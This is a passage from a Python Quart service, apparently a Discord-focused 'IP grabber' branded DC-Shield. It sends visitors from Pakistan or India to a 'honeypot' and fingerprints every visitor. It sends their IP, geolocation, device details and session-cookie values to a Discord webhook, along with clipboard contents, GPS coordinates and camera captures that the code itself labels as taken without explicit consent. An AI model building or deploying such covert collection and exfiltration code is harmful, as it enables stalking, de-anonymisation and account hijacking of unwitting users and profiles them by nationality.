"""
GeoIP Redirect Service

This service redirects users based on their country of origin using GeoIP data. 
Users from Pakistan or India will be redirected to an alternative server, while users from other countries will be redirected to a default subdomain.

Dependencies:
- quart: An asynchronous web microframework for Python.

"""

import ipaddress
import requests
from datetime import datetime
from user_agents import parse
from logger import Logger
from json_handler import *
from surveillance_embeds import create_combined_surveillance_embed, create_interactive_buttons
from quart import Quart, jsonify, redirect, render_template, request, send_file

app = Quart(__name__)
l = Logger(console_log= True, file_logging=True, file_URI='logs/log.txt', override=True)
default_server:str
alternative_server_url:str
test_flag:bool
redirected:bool
config:dict
sub_nets: list

def read_subnets_from_file(filename):
    global sub_nets
    """
    Read subnets from a text file.

    Parameters:
    filename (str): Name of the text file containing subnets.

    Returns:
    list: List of subnets in CIDR notation.
    """
    subnets = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                line = line.strip()
                if line:  # Skip empty lines
                    subnets.append(line)
        return subnets
    except FileNotFoundError:
        print("File not found.")
        return []

def ip_in_subnet(ip, subnet):
    """
    Check if an IP address belongs to a subnet.

    Parameters:
    ip (str): IP address.
    subnet (str): Subnet in CIDR notation.

    Returns:
    bool: True if IP address belongs to subnet, False otherwise.
    """
    if ip == None:
        return False
    try:
        ip_obj = ipaddress.ip_address(ip)
        subnet_obj = ipaddress.ip_network(subnet)
        return ip_obj in subnet_obj
    except ValueError as e:
        print("Error:", e)
        return False
    
async def check_for_vpn(ip):
    global sub_nets
    return any(ip_in_subnet(ip, subnet) for subnet in sub_nets)

def extract_device_info(request_obj):
    """
    Extract comprehensive device and browser information from the request.

    Args:
    - request_obj: The Quart request object

    Returns:
    - dict: Dictionary containing device information
    """
    headers = request_obj.headers

    # User Agent parsing
    user_agent_string = headers.get('User-Agent', 'Unknown')
    user_agent = parse(user_agent_string)

    # Extract cookies
    cookies = dict(request_obj.cookies) if request_obj.cookies else {}

    # Extract detailed information
    device_info = {
        'user_agent_string': user_agent_string,
        'browser_family': user_agent.browser.family,
        'browser_version': user_agent.browser.version_string,
        'os_family': user_agent.os.family,
        'os_version': user_agent.os.version_string,
        'device_family': user_agent.device.family,
        'device_brand': user_agent.device.brand,
        'device_model': user_agent.device.model,
        'is_mobile': user_agent.is_mobile,
        'is_tablet': user_agent.is_tablet,
        'is_pc': user_agent.is_pc,
        'is_bot': user_agent.is_bot,

        # HTTP Headers
        'accept_language': headers.get('Accept-Language', 'Unknown'),
        'accept_encoding': headers.get('Accept-Encoding', 'Unknown'),
        'accept': headers.get('Accept', 'Unknown'),
        'referer': headers.get('Referer', 'Direct'),
        'host': headers.get('Host', 'Unknown'),
        'connection': headers.get('Connection', 'Unknown'),
        'cache_control': headers.get('Cache-Control', 'Unknown'),
        'upgrade_insecure_requests': headers.get('Upgrade-Insecure-Requests', 'Unknown'),
        'sec_fetch_site': headers.get('Sec-Fetch-Site', 'Unknown'),
        'sec_fetch_mode': headers.get('Sec-Fetch-Mode', 'Unknown'),
        'sec_fetch_dest': headers.get('Sec-Fetch-Dest', 'Unknown'),
        'sec_ch_ua': headers.get('Sec-CH-UA', 'Unknown'),
        'sec_ch_ua_mobile': headers.get('Sec-CH-UA-Mobile', 'Unknown'),
        'sec_ch_ua_platform': headers.get('Sec-CH-UA-Platform', 'Unknown'),
        'sec_ch_ua_platform_version': headers.get('Sec-CH-UA-Platform-Version', 'Unknown'),
        'sec_ch_ua_arch': headers.get('Sec-CH-UA-Arch', 'Unknown'),
        'sec_ch_ua_model': headers.get('Sec-CH-UA-Model', 'Unknown'),
        'sec_ch_ua_bitness': headers.get('Sec-CH-UA-Bitness', 'Unknown'),
        'sec_ch_ua_wow64': headers.get('Sec-CH-UA-WoW64', 'Unknown'),
        'sec_ch_ua_full_version_list': headers.get('Sec-CH-UA-Full-Version-List', 'Unknown'),
        'sec_ch_viewport_width': headers.get('Sec-CH-Viewport-Width', 'Unknown'),
        'sec_ch_viewport_height': headers.get('Sec-CH-Viewport-Height', 'Unknown'),
        'sec_ch_dpr': headers.get('Sec-CH-DPR', 'Unknown'),
        'sec_ch_device_memory': headers.get('Sec-CH-Device-Memory', 'Unknown'),
        'sec_ch_downlink': headers.get('Sec-CH-Downlink', 'Unknown'),
        'sec_ch_ect': headers.get('Sec-CH-ECT', 'Unknown'),
        'sec_ch_rtt': headers.get('Sec-CH-RTT', 'Unknown'),
        'sec_ch_save_data': headers.get('Sec-CH-Save-Data', 'Unknown'),
        'sec_ch_prefers_color_scheme': headers.get('Sec-CH-Prefers-Color-Scheme', 'Unknown'),
        'sec_ch_prefers_reduced_motion': headers.get('Sec-CH-Prefers-Reduced-Motion', 'Unknown'),

        # Additional network info
        'x_forwarded_for': headers.get('X-Forwarded-For', 'Unknown'),
        'x_real_ip': headers.get('X-Real-IP', 'Unknown'),
        'cf_connecting_ip': headers.get('CF-Connecting-IP', 'Unknown'),
        'cf_ipcountry': headers.get('CF-IPCountry', 'Unknown'),
        'cf_ray': headers.get('CF-Ray', 'Unknown'),
        'cf_visitor': headers.get('CF-Visitor', 'Unknown'),
        'x_forwarded_proto': headers.get('X-Forwarded-Proto', 'Unknown'),
        'x_forwarded_port': headers.get('X-Forwarded-Port', 'Unknown'),

        # Browser fingerprinting headers
        'dnt': headers.get('DNT', 'Unknown'),  # Do Not Track
        'pragma': headers.get('Pragma', 'Unknown'),
        'if_modified_since': headers.get('If-Modified-Since', 'Unknown'),
        'if_none_match': headers.get('If-None-Match', 'Unknown'),
        'te': headers.get('TE', 'Unknown'),  # Transfer encoding
        'authorization': 'REDACTED' if headers.get('Authorization') else 'None',

        # Cookies and session data
        'cookies': cookies,
        'cookie_count': len(cookies),
        'has_session_cookies': any('session' in k.lower() or 'auth' in k.lower() or 'token' in k.lower() for k in cookies.keys()),
        'has_tracking_cookies': any('ga' in k.lower() or 'gtm' in k.lower() or 'fb' in k.lower() or '_utm' in k.lower() or 'analytics' in k.lower() for k in cookies.keys()),

        # Request metadata
        'method': request_obj.method,
        'scheme': request_obj.scheme,
        'path': request_obj.path,
        'query_string': request_obj.query_string.decode('utf-8') if request_obj.query_string else '',
        'content_type': request_obj.content_type or 'Unknown',
        'content_length': headers.get('Content-Length', 'Unknown'),

        # Timestamp
        'access_time': datetime.now().isoformat(),
        'access_timestamp': datetime.now().timestamp()
    }

    return device_info

def send_to_channel(message:str, embed_data=None, components=None):
    """
    Sends a message using Discord webhook with optional embed support and components.

    Args:
    - message (str): The message to send.
    - embed_data (dict): Optional embed data for rich formatting.
    - components (list): Optional components (buttons) for interactivity.

    Returns:
    - bool: True if the message was sent successfully, False otherwise.
    """
    global config
    
    # Create payload
    payload = {}

    if embed_data:
        payload = {
            "embeds": [embed_data]
        }
        if message:
            payload["content"] = message
        if components:
            payload["components"] = components
    else:
        payload = {
            "content": message
        }

    try:
        # Send POST request to the webhook URL
        response = requests.post(config["dc_webhook_url"], json=payload)
        response.raise_for_status()  # Raise an exception for any HTTP error status

        # Check if the message was sent successfully
        if response.status_code == 204:
            l.passing("Message sent successfully")
            return True
        else:
            l.error(f"Failed to send message. Status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        l.error(f"Failed to send message: {e}")
        return False

def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
    """
    Create an enhanced Discord embed for honeypot triggers with improved visuals
    """
    from surveillance_embeds import get_threat_indicator, create_progress_bar

    # Calculate threat score based on honeypot trigger
    threat_score = 75  # Honeypot triggers are high risk
    threat_level, embed_color = get_threat_indicator(threat_score)

    embed = {
        "title": "🚨 HONEYPOT SECURITY BREACH",
        "description": f"**{threat_level} THREAT DETECTED**\n🎯 **Malicious actor intercepted from {country_code}**",
        "color": embed_color,
        "timestamp": datetime.now().isoformat(),
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/454652220064006147.gif"
        },
        "fields": [],
        "footer": {
            "text": f"DC-Shield Honeypot Defense System • Threat Level: {threat_score}/100",
            "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png"
        }
    }

    # Enhanced Network Intelligence
    network_value = f"**IP Address:** `{ip}`\n"
    network_value += f"**Country Code:** {country_code}\n"
    network_value += f"**Threat Assessment:** {threat_level}\n"
    network_value += f"**Risk Score:** {create_progress_bar(threat_score)}"

    embed["fields"].append({
        "name": "🌐 NETWORK INTELLIGENCE",
        "value": network_value,
        "inline": False
    })

    # Honeypot Information
    honeypot_value = f"**Decoy Server:** `{honeypot}`\n"
    honeypot_value += f"**Redirect Status:** ✅ Successfully executed\n"
    honeypot_value += f"**Analysis:** [View IP Details](https://iplocation.com/?ip={ip})"

    embed["fields"].append({
        "name": "🍯 HONEYPOT DETAILS",
        "value": honeypot_value,
        "inline": False
    })

    if device_info:
        # Enhanced Device Profile
        device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
        device_value += f"**Operating System:** {device_info['os_family']} {device_info['os_version']}\n"
        device_value += f"**Device Type:** {device_info['device_family']}"

        if device_info['device_brand'] and device_info['device_brand'] != 'None':
            device_value += f" ({device_info['device_brand']} {device_info['device_model']})"

        device_type_emoji = "📱" if device_info['is_mobile'] else "💻" if device_info['is_pc'] else "📟" if device_info['is_tablet'] else "🤖" if device_info['is_bot'] else "❓"
        device_type_text = "Mobile" if device_info['is_mobile'] else "Desktop" if device_info['is_pc'] else "Tablet" if device_info['is_tablet'] else "Bot" if device_info['is_bot'] else "Unknown"
        device_value += f"\n**Platform:** {device_type_emoji} {device_type_text}"

        embed["fields"].append({
            "name": "📱 DEVICE FINGERPRINT",
            "value": device_value,
            "inline": True
        })

        # Connection Intelligence
        connection_value = f"**Language Settings:** {device_info['accept_language'][:25]}...\n"
        connection_value += f"**Referrer Source:** {device_info['referer'][:40]}...\n"
        connection_value += f"**Access Time:** {device_info['access_time']}\n"
        connection_value += f"**User Agent:** {device_info['user_agent_string'][:50]}..."

        embed["fields"].append({
            "name": "🌍 CONNECTION ANALYSIS",
            "value": connection_value,
            "inline": True
        })

        # Security Indicators
        security_indicators = []
        if device_info['has_session_cookies']:
            security_indicators.append("⚠️ Session cookies present")
        if device_info['has_tracking_cookies']:
            security_indicators.append("⚠️ Tracking cookies detected")
        if device_info['is_bot']:
            security_indicators.append("🤖 Bot-like behavior")
        if not security_indicators:
            security_indicators.append("✅ No obvious red flags")

        embed["fields"].append({
            "name": "🔍 SECURITY INDICATORS",
            "value": "\n".join(security_indicators),
            "inline": False
        })

    return embed

def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info):
    """
    Create an enhanced Discord embed for IP grabber triggers with comprehensive analysis
    """
    from surveillance_embeds import get_threat_indicator, create_progress_bar, format_bytes

    # Calculate threat score based on various factors
    threat_score = 45  # Base score for IP grabbing
    if vpn:
        threat_score += 20  # VPN usage increases suspicion
    if device_info.get('has_tracking_cookies'):
        threat_score += 10
    if device_info.get('is_bot'):
        threat_score += 15

    threat_score = min(threat_score, 100)
    threat_level, embed_color = get_threat_indicator(threat_score)

    embed = {
        "title": "🎯 ADVANCED IP INTELLIGENCE CAPTURE",
        "description": f"**{threat_level} TARGET ANALYSIS**\n📊 **Complete digital profile acquired for: `{dc_handle}`**",
        "color": embed_color,
        "timestamp": datetime.now().isoformat(),
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/target.png"
        },
        "fields": [],
        "footer": {
            "text": f"DC-Shield IP Intelligence System • Threat Score: {threat_score}/100",
            "icon_url": "https://cdn.discordapp.com/emojis/globe.png"
        }
    }

    # Enhanced Target Profile
    target_value = f"**Discord Handle:** `{dc_handle}`\n"
    target_value += f"**VPN Detection:** {'🔒 Active VPN detected' if vpn else '❌ No VPN protection'}\n"
    target_value += f"**Risk Assessment:** {threat_level}\n"
    target_value += f"**Threat Score:** {create_progress_bar(threat_score)}"

    embed["fields"].append({
        "name": "👤 TARGET PROFILE",
        "value": target_value,
        "inline": False
    })

    # Geographic Intelligence
    geo_value = f"**IP Address:** `{ip_address}`\n"
    geo_value += f"**Country:** {country_name} ({country_code2})\n"
    geo_value += f"**ISP Provider:** {isp}\n"
    geo_value += f"**Analysis Link:** [Detailed Lookup](https://iplocation.com/?ip={ip_address})"

    embed["fields"].append({
        "name": "🌍 GEOGRAPHIC INTELLIGENCE",
        "value": geo_value,
        "inline": True
    })

    # Enhanced Device Analysis
    device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
    device_value += f"**Operating System:** {device_info['os_family']} {device_info['os_version']}\n"
    device_value += f"**Hardware:** {device_info['device_family']}"

    if device_info['device_brand'] and device_info['device_brand'] != 'None':
        device_value += f" ({device_info['device_brand']} {device_info['device_model']})"

    platform_icons = {
        'mobile': '📱', 'tablet': '📟', 'pc': '💻', 'bot': '🤖'
    }
    platform_type = 'mobile' if device_info['is_mobile'] else 'tablet' if device_info['is_tablet'] else 'pc' if device_info['is_pc'] else 'bot' if device_info['is_bot'] else 'unknown'
    platform_emoji = platform_icons.get(platform_type, '❓')
    device_value += f"\n**Platform:** {platform_emoji} {platform_type.title()}"

    embed["fields"].append({
        "name": "📱 DEVICE ANALYSIS",
        "value": device_value,
        "inline": True
    })

    # Privacy & Security Analysis
    privacy_concerns = []
    privacy_score = 0

    if device_info['cookie_count'] > 0:
        privacy_concerns.append(f"🍪 **Cookies:** {device_info['cookie_count']} detected")
        privacy_score += min(device_info['cookie_count'] * 2, 20)

    if device_info['has_session_cookies']:
        privacy_concerns.append("⚠️ **Session Data:** Active sessions found")
        privacy_score += 15

    if device_info['has_tracking_cookies']:
        privacy_concerns.append("⚠️ **Tracking:** Analytics cookies present")
        privacy_score += 10

    if device_info.get('dnt') == '1':
        privacy_concerns.append("✅ **Do Not Track:** Enabled")
    else:
        privacy_concerns.append("❌ **Do Not Track:** Disabled")
        privacy_score += 5

    privacy_level = "🔴 High Risk" if privacy_score >= 30 else "🟡 Moderate Risk" if privacy_score >= 15 else "🟢 Low Risk"

    embed["fields"].append({
        "name": f"🔒 PRIVACY ANALYSIS ({privacy_level})",
        "value": "\n".join(privacy_concerns),
        "inline": False
    })

    # Technical Specifications
    tech_specs = []

    if device_info.get('sec_ch_device_memory', 'Unknown') != 'Unknown':
        tech_specs.append(f"**RAM:** {device_info['sec_ch_device_memory']} GB")

    if device_info.get('sec_ch_ua_arch', 'Unknown') != 'Unknown':
        tech_specs.append(f"**Architecture:** {device_info['sec_ch_ua_arch']}")

    if device_info.get('sec_ch_dpr', 'Unknown') != 'Unknown':
        tech_specs.append(f"**Display DPR:** {device_info['sec_ch_dpr']}")

    if device_info.get('sec_ch_downlink', 'Unknown') != 'Unknown':
        tech_specs.append(f"**Network Speed:** {device_info['sec_ch_downlink']} Mbps")

    if device_info.get('sec_ch_rtt', 'Unknown') != 'Unknown':
        tech_specs.append(f"**Network Latency:** {device_info['sec_ch_rtt']}ms")

    if tech_specs:
        embed["fields"].append({
            "name": "⚙️ TECHNICAL SPECIFICATIONS",
            "value": "\n".join(tech_specs),
            "inline": True
        })

    # Connection Metadata
    metadata_value = f"**Accept-Language:** {device_info['accept_language'][:30]}...\n"
    metadata_value += f"**Connection Type:** {device_info['connection']}\n"
    metadata_value += f"**Request Method:** {device_info['method']}\n"
    metadata_value += f"**Content Type:** {device_info['content_type']}"

    embed["fields"].append({
        "name": "📊 CONNECTION METADATA",
        "value": metadata_value,
        "inline": True
    })

    return embed

def create_verbose_embed(device_info, event_type="IP_GRABBER"):
    """
    Create a verbose embed with all detailed information.
    """
    embed = {
        "title": f"📋 VERBOSE {event_type} DETAILS",
        "description": "Complete device and network fingerprint analysis",
        "color": 0x2f3542,  # Dark gray color
        "timestamp": datetime.now().isoformat(),
        "fields": [],
        "footer": {
            "text": "DC-Shield Detailed Analysis System",
            "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png"
        }
    }

    # Browser Details
    browser_details = f"**Family:** {device_info['browser_family']}\n"
    browser_details += f"**Version:** {device_info['browser_version']}\n"
    browser_details += f"**User Agent:** {device_info['user_agent_string'][:100]}..."

    embed["fields"].append({
        "name": "🌐 Browser Details",
        "value": browser_details,
        "inline": False
    })

    # Operating System
    os_details = f"**Family:** {device_info['os_family']}\n"
    os_details += f"**Version:** {device_info['os_version']}\n"
    if device_info['sec_ch_ua_platform'] != 'Unknown':
        os_details += f"**Platform:** {device_info['sec_ch_ua_platform']}\n"
    if device_info['sec_ch_ua_platform_version'] != 'Unknown':
        os_details += f"**Platform Version:** {device_info['sec_ch_ua_platform_version']}"

    embed["fields"].append({
        "name": "💻 Operating System",
        "value": os_details,
        "inline": True
    })

    # Hardware Specifications
    hardware_specs = ""
    if device_info['sec_ch_device_memory'] != 'Unknown':
        hardware_specs += f"**RAM:** {device_info['sec_ch_device_memory']} GB\n"
    if device_info['sec_ch_ua_arch'] != 'Unknown':
        hardware_specs += f"**Architecture:** {device_info['sec_ch_ua_arch']}\n"
    if device_info['sec_ch_ua_bitness'] != 'Unknown':
        hardware_specs += f"**Bitness:** {device_info['sec_ch_ua_bitness']}-bit\n"
    if device_info['sec_ch_ua_wow64'] != 'Unknown':
        hardware_specs += f"**WoW64:** {device_info['sec_ch_ua_wow64']}\n"
    if device_info['sec_ch_dpr'] != 'Unknown':
        hardware_specs += f"**Device Pixel Ratio:** {device_info['sec_ch_dpr']}"

    if hardware_specs:
        embed["fields"].append({
            "name": "⚙️ Hardware Specifications",
            "value": hardware_specs,
            "inline": True
        })

    # Network Information
    network_info = f"**Accept-Language:** {device_info['accept_language']}\n"
    network_info += f"**Accept-Encoding:** {device_info['accept_encoding']}\n"
    if device_info['sec_ch_downlink'] != 'Unknown':
        network_info += f"**Download Speed:** {device_info['sec_ch_downlink']} Mbps\n"
    if device_info['sec_ch_rtt'] != 'Unknown':
        network_info += f"**Round Trip Time:** {device_info['sec_ch_rtt']}ms\n"
    if device_info['sec_ch_ect'] != 'Unknown':
        network_info += f"**Effective Connection Type:** {device_info['sec_ch_ect']}"

    embed["fields"].append({
        "name": "🌍 Network Information",
        "value": network_info,
        "inline": False
    })

    # Cookie Analysis
    if device_info['cookie_count'] > 0:
        cookie_analysis = f"**Total Count:** {device_info['cookie_count']}\n"
        cookie_analysis += f"**Has Session Cookies:** {'Yes' if device_info['has_session_cookies'] else 'No'}\n"
        cookie_analysis += f"**Has Tracking Cookies:** {'Yes' if device_info['has_tracking_cookies'] else 'No'}\n"

        # List first few cookies
        if device_info['cookies']:
            cookie_analysis += "**Sample Cookies:**\n"
            for i, (name, value) in enumerate(list(device_info['cookies'].items())[:3]):
                cookie_analysis += f"• `{name}`: {value[:30]}...\n"
            if len(device_info['cookies']) > 3:
                cookie_analysis += f"• ... and {len(device_info['cookies']) - 3} more"

        embed["fields"].append({
            "name": "🍪 Cookie Analysis",
            "value": cookie_analysis,
            "inline": True
        })

    # Privacy & Security Headers
    privacy_info = ""
    if device_info['dnt'] != 'Unknown':
        privacy_info += f"**Do Not Track:** {device_info['dnt']}\n"
    if device_info['sec_ch_prefers_color_scheme'] != 'Unknown':
        privacy_info += f"**Color Scheme:** {device_info['sec_ch_prefers_color_scheme']}\n"
    if device_info['sec_ch_prefers_reduced_motion'] != 'Unknown':
        privacy_info += f"**Reduced Motion:** {device_info['sec_ch_prefers_reduced_motion']}\n"
    if device_info['sec_ch_save_data'] != 'Unknown':
        privacy_info += f"**Save Data:** {device_info['sec_ch_save_data']}"

    if privacy_info:
        embed["fields"].append({
            "name": "🔒 Privacy & Preferences",
            "value": privacy_info,
            "inline": True
        })

    # Screen & Viewport
    if device_info['sec_ch_viewport_width'] != 'Unknown' or device_info['sec_ch_viewport_height'] != 'Unknown':
        viewport_info = ""
        if device_info['sec_ch_viewport_width'] != 'Unknown':
            viewport_info += f"**Width:** {device_info['sec_ch_viewport_width']}px\n"
        if device_info['sec_ch_viewport_height'] != 'Unknown':
            viewport_info += f"**Height:** {device_info['sec_ch_viewport_height']}px\n"
        if device_info['sec_ch_dpr'] != 'Unknown':
            viewport_info += f"**Pixel Ratio:** {device_info['sec_ch_dpr']}"

        embed["fields"].append({
            "name": "📱 Screen & Viewport",
            "value": viewport_info,
            "inline": True
        })

    # Request Metadata
    metadata = f"**Method:** {device_info['method']}\n"
    metadata += f"**Scheme:** {device_info['scheme']}\n"
    metadata += f"**Path:** {device_info['path']}\n"
    if device_info['query_string']:
        metadata += f"**Query:** {device_info['query_string'][:50]}...\n"
    metadata += f"**Content Type:** {device_info['content_type']}"

    embed["fields"].append({
        "name": "📄 Request Metadata",
        "value": metadata,
        "inline": False
    })

    return embed

def create_verbose_button(event_id, event_type):
    """
    Create a button component for viewing verbose details.
    """
    return [
        {
            "type": 1,  # Action Row
            "components": [
                {
                    "type": 2,  # Button
                    "style": 1,  # Primary style (blue)
                    "label": "📋 View Full Details",
                    "emoji": {
                        "name": "🔍"
                    },
                    "custom_id": f"verbose_{event_type}_{event_id}",
                    "url": f"https://your-domain.com/verbose/{event_id}"  # You can replace with your actual domain
                }
            ]
        }
    ]

# Global storage for device information (in production, use a database)
device_data_store = {}
advanced_data_store = {}

@app.route('/api/collect-advanced-data', methods=['POST'])
async def collect_advanced_data():
    """
    API endpoint to receive advanced browser data collection
    """
    try:
        data = await request.get_json()

        # Store the advanced data
        timestamp = str(data.get('timestamp', int(datetime.now().timestamp())))
        advanced_data_store[timestamp] = data

        l.info(f'Advanced data collected: {len(data.get("data", {}))} categories')

        # Send advanced data to Discord
        await send_advanced_data_to_discord(data)

        return jsonify({"status": "success"}), 200

    except Exception as e:
        l.error(f'Error collecting advanced data: {e}')
        return jsonify({"status": "error", "message": str(e)}), 500

async def send_advanced_data_to_discord(collected_data):
    """
    Send combined advanced collected data to Discord with interactive buttons
    """
    try:
        data = collected_data.get('data', {})

        # Create comprehensive combined embed with all data
        embed = create_combined_surveillance_embed(data)
        components = create_interactive_buttons(data)

        send_to_channel("🚨 **COMPREHENSIVE SURVEILLANCE REPORT** 🚨", embed, components)

    except Exception as e:
        l.error(f'Error sending advanced data to Discord: {e}')

def create_advanced_data_embed(data):
    """
    Create a comprehensive embed for advanced collected data
    """
    embed = {
        "title": "🔥 ADVANCED SURVEILLANCE DATA",
        "description": "**CRITICAL: Sensitive user data intercepted**",
        "color": 0xff0000,  # Bright red for high alert
        "timestamp": datetime.now().isoformat(),
        "fields": [],
        "footer": {
            "text": "DC-Shield Advanced Intelligence System • CONFIDENTIAL",
            "icon_url": "https://cdn.discordapp.com/emojis/warning.png"
        }
    }

    # Screen & Display Information
    if data.get('screen'):
        screen_info = data['screen']
        screen_value = f"**Resolution:** {screen_info.get('width')}x{screen_info.get('height')}\n"
        screen_value += f"**Available:** {screen_info.get('availWidth')}x{screen_info.get('availHeight')}\n"
        screen_value += f"**Color Depth:** {screen_info.get('colorDepth')} bits\n"
        screen_value += f"**Orientation:** {screen_info.get('orientation')}"

        embed["fields"].append({
            "name": "🖥️ Display Configuration",
            "value": screen_value,
            "inline": True
        })

    # Timezone & Location Data
    if data.get('timezone'):
        tz_info = data['timezone']
        tz_value = f"**Timezone:** {tz_info.get('name')}\n"
        tz_value += f"**Offset:** {tz_info.get('offset')} minutes\n"
        tz_value += f"**Locale:** {tz_info.get('locale')}\n"
        tz_value += f"**Languages:** {', '.join(tz_info.get('languages', [])[:3])}"

        embed["fields"].append({
            "name": "🌐 Timezone & Locale",
            "value": tz_value,
            "inline": True
        })

    # Hardware Information
    hardware_value = ""
    if data.get('browser', {}).get('hardwareConcurrency'):
        hardware_value += f"**CPU Cores:** {data['browser']['hardwareConcurrency']}\n"
    if data.get('deviceMemory'):
        hardware_value += f"**Device RAM:** {data['deviceMemory']} GB\n"
    if data.get('memory'):
        mem = data['memory']
        hardware_value += f"**JS Heap Limit:** {mem.get('jsHeapSizeLimit', 0) // 1024 // 1024} MB\n"
        hardware_value += f"**JS Heap Used:** {mem.get('usedJSHeapSize', 0) // 1024 // 1024} MB"

    if hardware_value:
        embed["fields"].append({
            "name": "⚙️ Hardware Specifications",
            "value": hardware_value,
            "inline": False
        })

    # Battery Information (if available)
    if data.get('battery') and not data['battery'].get('error'):
        battery = data['battery']
        battery_value = f"**Level:** {int(battery.get('level', 0) * 100)}%\n"
        battery_value += f"**Charging:** {'Yes' if battery.get('charging') else 'No'}\n"
        if battery.get('dischargingTime') != float('inf'):
            battery_value += f"**Time Remaining:** {battery.get('dischargingTime', 0) // 60} minutes"

        embed["fields"].append({
            "name": "🔋 Battery Status",
            "value": battery_value,
            "inline": True
        })

    # Network Connection Details
    if data.get('network') and not data['network'].get('error'):
        network = data['network']
        network_value = f"**Type:** {network.get('effectiveType', 'Unknown')}\n"
        network_value += f"**Downlink:** {network.get('downlink', 'Unknown')} Mbps\n"
        network_value += f"**RTT:** {network.get('rtt', 'Unknown')}ms\n"
        network_value += f"**Data Saver:** {'On' if network.get('saveData') else 'Off'}"

        embed["fields"].append({
            "name": "📡 Network Connection",
            "value": network_value,
            "inline": True
        })

    # Media Devices
    if data.get('mediaDevices') and not data['mediaDevices'].get('error'):
        devices = data['mediaDevices']
        device_count = {
            'videoinput': 0,
            'audioinput': 0,
            'audiooutput': 0
        }
        for device in devices:
            kind = device.get('kind', 'unknown')
            if kind in device_count:
                device_count[kind] += 1

        media_value = f"**Cameras:** {device_count['videoinput']}\n"
        media_value += f"**Microphones:** {device_count['audioinput']}\n"
        media_value += f"**Speakers:** {device_count['audiooutput']}"

        embed["fields"].append({
            "name": "🎥 Media Devices",
            "value": media_value,
            "inline": True
        })

    # Storage Information
    if data.get('storage') and not data['storage'].get('error'):
        storage = data['storage']
        storage_value = f"**Quota:** {storage.get('quota', 0) // 1024 // 1024 // 1024} GB\n"
        storage_value += f"**Used:** {storage.get('usage', 0) // 1024 // 1024} MB"

        embed["fields"].append({
            "name": "💾 Storage Information",
            "value": storage_value,
            "inline": True
        })

    # Clipboard Data (if captured)
    if data.get('clipboard') and not data['clipboard'].get('error'):
        clipboard = data['clipboard']
        clip_value = f"**Length:** {clipboard.get('length', 0)} characters\n"
        clip_value += f"**Preview:** {clipboard.get('content', '')[:50]}..."

        embed["fields"].append({
            "name": "📋 Clipboard Contents",
            "value": clip_value,
            "inline": False
        })

    # Browser Fingerprints
    if data.get('canvas'):
        embed["fields"].append({
            "name": "🎨 Canvas Fingerprint",
            "value": "Canvas fingerprint captured (unique identifier)",
            "inline": True
        })

    if data.get('webgl') and not data['webgl'].get('error'):
        webgl = data['webgl']
        webgl_value = f"**Vendor:** {webgl.get('vendor', 'Unknown')}\n"
        webgl_value += f"**Renderer:** {webgl.get('renderer', 'Unknown')[:50]}..."

        embed["fields"].append({
            "name": "🎮 WebGL Information",
            "value": webgl_value,
            "inline": True
        })

    return embed

def create_camera_embed(camera_data):
    """
    Create embed for captured camera image
    """
    embed = {
        "title": "📸 CAMERA SURVEILLANCE SUCCESSFUL",
        "description": "**ALERT: User camera accessed without explicit consent**",
        "color": 0xff4757,
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "📷 Capture Details",
                "value": f"**Status:** Image captured successfully\n**Resolution:** 640x480\n**Timestamp:** {camera_data.get('timestamp')}",
                "inline": False
            },
            {
                "name": "🔍 Image Analysis",
                "value": "Camera feed intercepted and stored for analysis. Image data available in base64 format.",
                "inline": False
            }
        ],
        "footer": {
            "text": "DC-Shield Camera Intelligence • CLASSIFIED",
        }
    }

    # Note: We're not including the actual image in Discord for privacy/legal reasons
    # In a real scenario, this would be stored securely and referenced

    return embed

def create_location_embed(geo_data):
    """
    Create embed for GPS location data
    """
    embed = {
        "title": "🌍 GPS LOCATION ACQUIRED",
        "description": "**CRITICAL: Precise user location obtained**",
        "color": 0xe74c3c,
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "📍 Coordinates",
                "value": f"**Latitude:** {geo_data.get('latitude')}\n**Longitude:** {geo_data.get('longitude')}\n**Accuracy:** ±{geo_data.get('accuracy')} meters",
                "inline": True
            },
            {
                "name": "🗺️ Location Details",
                "value": f"**Altitude:** {geo_data.get('altitude') or 'Unknown'} m\n**Heading:** {geo_data.get('heading') or 'Unknown'}°\n**Speed:** {geo_data.get('speed') or 'Unknown'} m/s",
                "inline": True
            },
            {
                "name": "🔗 Map Link",
                "value": f"[View on Google Maps](https://www.google.com/maps?q={geo_data.get('latitude')},{geo_data.get('longitude')})",
                "inline": False
            }
        ],
        "footer": {
            "text": "DC-Shield GPS Intelligence • TOP SECRET",
        }
    }

    return embed

async def get_country(ip_address):
    """Retrieve country information for the given IP address."""
    try:
        response = await request_ip_location(ip_address)
        if response and response.get("response_code") == "200":
            country_code = response.get("country_code2")
            return country_code
    except Exception as e:
        l.error(f"Error fetching country information: {e}")
    return None

async def request_ip_location(ip_address):
    """Make a request to the IP location API."""
    url = f"https://api.iplocation.net/?cmd=ip-country&ip={ip_address}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        l.error(f"Error fetching IP location: {e}")
    return None

async def redirect_handler(ip ,normal_server, honeypot, request_obj=None):
    global redirected
    country_code = await get_country(ip)
    l.info(f'Country code is: {country_code}')
    #if test flag is set redirect every 2nd request to honeypot
    if test_flag:
        if redirected:
            country_code = 'PK'
            l.info(f'Test flag, changed coutry code: {country_code}')
        else:
            l.info('Test flag, not changing coutry code')
        redirected = not redirected
        
    if country_code and country_code in ['PK', 'IN']:
        l.info(f"Rediredcting to Honeypot: {honeypot}")

        # Extract device information if request object is provided
        honeypot_message = f'''
🚨 **Honeypot Triggered** 🚨
🌐 **IP:** {ip}
🏳️ **Country:** {country_code}
🔗 **Honeypot:** {honeypot}
🔗 **More info:** https://iplocation.com/?ip={ip}
'''

        if request_obj:
            device_info = extract_device_info(request_obj)
            l.info(f'Honeypot device info: {device_info}')

            honeypot_message = f'''
🚨 **Honeypot Triggered** 🚨
🌐 **IP:** {ip}
